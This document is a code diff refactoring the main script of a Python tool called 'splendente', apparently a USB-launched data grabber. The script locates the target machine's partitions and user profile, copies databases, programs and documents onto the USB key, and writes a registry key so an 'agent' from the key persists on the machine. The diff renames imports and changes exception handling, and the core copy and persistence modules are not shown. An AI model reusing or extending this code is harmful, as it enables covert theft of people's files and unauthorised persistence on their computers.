@@ -29,13 +29,13 @@ import glob
 import shutil
 import sys
 
-from core.splendenteDirs import Directories
-from core.splendenteConf import Conf
-from core.splendenteUtils import Date, SmallSize, MediumSize, HighSize, BigSize
-from core.splendenteMount import TargetMount, UsbMount
-from core.splendenteCopy import Copy
-from core.splendentePersistence import Persistence
-from core.splendenteError import Error, ERROR_FILE_EMPTY, ERROR_FILE_NOT_FOUND, ERROR_BAD_ARGUMENTS, ERROR_BAD_ENVIRONMENT,\
+from core.splendente_dirs import Directories
+from core.splendente_conf import Conf
+from core.splendente_utils import Date, SmallSize, MediumSize, HighSize, BigSize
+from core.splendente_mount import TargetMount, UsbMount
+from core.splendente_copy import Copy
+from core.splendente_persistence import Persistence
+from core.splendente_error import ERROR_FILE_EMPTY, ERROR_FILE_NOT_FOUND, ERROR_BAD_ARGUMENTS, ERROR_BAD_ENVIRONMENT,\
                                 ERROR_INVALID_DRIVE, ERROR_PATH_NOT_FOUND, EXIT_SUCCESS
 
 #--------------------------------------------------------- [Global] ---------------------------------------------------------#
@@ -51,10 +51,8 @@ def main():
         usbMountLetter  = usbMount.SearchUsbMountLetter()
 
         if usbMountLetter != None:
-
             # -- Check if log file is available on USB key -- #
             if os.path.exists("{0}\\log\\splendente.log".format(usbMountLetter)) == True:
-
                 # -- Define log file -- #
                 logFile = "{0}\\log\\splendente.log".format(usbMountLetter)
                 logging.basicConfig(
@@ -71,7 +69,6 @@ def main():
                 # -- Check if conf file is available on USB key -- #
                 if os.path.exists(usbMountLetter + "\\conf" + "\\splendente.ini") == True:
                     confUsbDirectory = usbMountLetter + "\\conf" + "\\splendente.ini"
-
                     # --- Name of folder that will contain all data in USB key --- #
                     dataUsbDirectory = "{0}\\data_{1}".format(usbMountLetter, Date())
                     os.makedirs(dataUsbDirectory)
@@ -82,9 +79,8 @@ def main():
                         # --- Found directories on target --- #
                         targetMount         = TargetMount()
                         targetMountLetter   = targetMount.SearchPartitionsMount()
-
-                        conf        = Conf()
-                        directories = Directories()
+                        conf                = Conf()
+                        directories         = Directories()
 
                         directoriesFound = directories.Search(conf.Directories(confUsbDirectory),"Target",targetMountLetter, usbMountLetter)
                         if directoriesFound != ERROR_BAD_ARGUMENTS:
@@ -109,19 +105,16 @@ def main():
 
                         # --- Check if agent directory is available on USB key --- #
                         if os.path.exists("{0}\\agent".format(usbMountLetter)) == True:
-
                             # --- Files copy from USB key --- #
                             agentUsbDirectory = "{0}\\agent".format(usbMountLetter)
-
                             try:
                                 persistence = Persistence()
-
                                 if (persistence.Registry(agentUsbDirectory) != EXIT_SUCCESS):
                                     logging.error("Persistence : Adding registry key -> Failed")
                                 else:
                                     logging.info("Persistence : Adding registry key -> Successful")
-                            except Error:
-                                logging.error(Error)
+                            except Exception as e:
+                                logging.error(e)
                                 pass
                             
                         else:
@@ -129,10 +122,8 @@ def main():
 
                         # -- Files copy from target -- #
                         copy = Copy()
-
                         for usbFolder in usbDirectories:
                             for targetPath in directoriesFound:
-
                                 # -- Folders of user profile and other partitions mounted -- #
                                 if usbFolder in targetPath:
                                     usbFolderFound = dataUsbDirectory + "\\" + usbFolder
@@ -174,13 +165,12 @@ def main():
                                             shutil.rmtree(usbFolderFound)
                                             if os.path.exists(usbFolderFound) == False:
                                                 logging.info("Remove {0} -> Failed (No data)".format(usbFolderFound))
-                                        except Error:
+                                        except Exception:
                                             pass
 
-                                # -- UserProfile Only -- #
+                                # -- User profile Only -- #
                                 elif re.match(r"^WindowsHome$", usbFolder) and targetPath == os.environ["USERPROFILE"]:
                                     usbFolderFound = dataUsbDirectory + "\\" + usbFolder
-
                                     copy.SmallDepth(conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
                                     copy.SmallDepth(conf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
                                     copy.SmallDepth(conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
@@ -195,7 +185,7 @@ def main():
                                             shutil.rmtree(usbFolderFound)
                                             if os.path.exists(usbFolderFound) == False:
                                                 logging.info("Remove {0} -> Failed (No data)".format(usbFolderFound))
-                                        except Error:
+                                        except Exception:
                                             pass
                                 else:
                                     continue
